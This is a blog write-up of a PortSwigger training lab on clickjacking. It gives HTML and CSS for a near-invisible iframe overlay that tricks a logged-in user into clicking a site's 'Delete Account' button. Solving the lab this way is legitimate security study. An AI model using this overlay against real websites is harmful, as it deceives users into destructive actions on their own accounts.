---
layout: single
title: "Portswigger’s lab write up: Basic clickjacking with CSRF token protection"
date: 2022-10-10 22:54:34 -3400
categories: web, portswigger, clickjacking, writeups
---

![Portswigger’s lab write up: Basic clickjacking with CSRF token protection]({{ site.url }}{{ site.baseurl }}/assets/img/portswigger’s-lab-write-up:-basic-clickjacking-with-csrf-token-protection-00.png)
------------
In this apprentice level lab, we will exploit the delete account flow from a website vulnerable to clickjacking even though there is some CSRF token protection present.


Upon logging in with the given credentials, we notice that after going to the Account’s page, all that is needed to delete a user account is click on the `Delete Account` button. Let’s use the writing material’s clickjacking template to craft our exploit:

```jsx
<head>
   <style>
      iframe {
       position:relative;
       width:700px;
       height:600px;
       opacity:0.1;
       z-index:2;
      }
      div {
       position:absolute;
       z-index:1;
      }
   </style>
</head>
<body>
   <div>
      CLICK HERE
   </div>
   <iframe src="${LAB_ACCOUNT_ROUTE_URL}">
   </iframe>
</body>

```
This is how the template looks on our exploit server:

![Image description]({{ site.url }}{{ site.baseurl }}/assets/img/portswigger’s-lab-write-up:-basic-clickjacking-with-csrf-token-protection-01.png)

We need to modify the location of the `CLICK ME` div tag so that it is on top of the `Delete Account` button on the vulnerable website. Note that we are setting the iframe’s opacity to `0.1` to be able to check the exploit appearance and then modifying the div’s top and left CSS properties so that when a logged in user clicks on the `CLICK ME` div on our website, they are actually clicking on the vulnerable website’s button to delete their account. After setting the top property to 500px and the left property to 50px, it looks like the buttons are aligned to perform a successful attack. At this point, our exploit looks like this:

```jsx
<head>
   <style>
      iframe {
       position:relative;
       width:700px;
       height:600px;
       opacity:0.1;
       z-index:2;
      }
      div {
       position:absolute;
       z-index:1;
       top:500px;
       left:50px;
      }
   </style>
</head>
<body>
   <div>
      CLICK HERE
   </div>
   <iframe src="${LAB_ACCOUNT_ROUTE_URL}">
   </iframe>
</body>
```

![Image description]({{ site.url }}{{ site.baseurl }}/assets/img/portswigger’s-lab-write-up:-basic-clickjacking-with-csrf-token-protection-02.png)

All we need to do is set the iframe’s opacity to 0.00001 or something similar so that it is almost invisible and send the exploit to our victim.

Check out this write up on the Art Of Code: https://artofcode.tech/portswiggers-lab-write-up-basic-clickjacking-with-csrf-token-protection/

Github: https://github.com/christianpaez/portswigger/tree/main/labs/apprentice/clickjacking/basic-clickjacking-with-csrf-token-protection
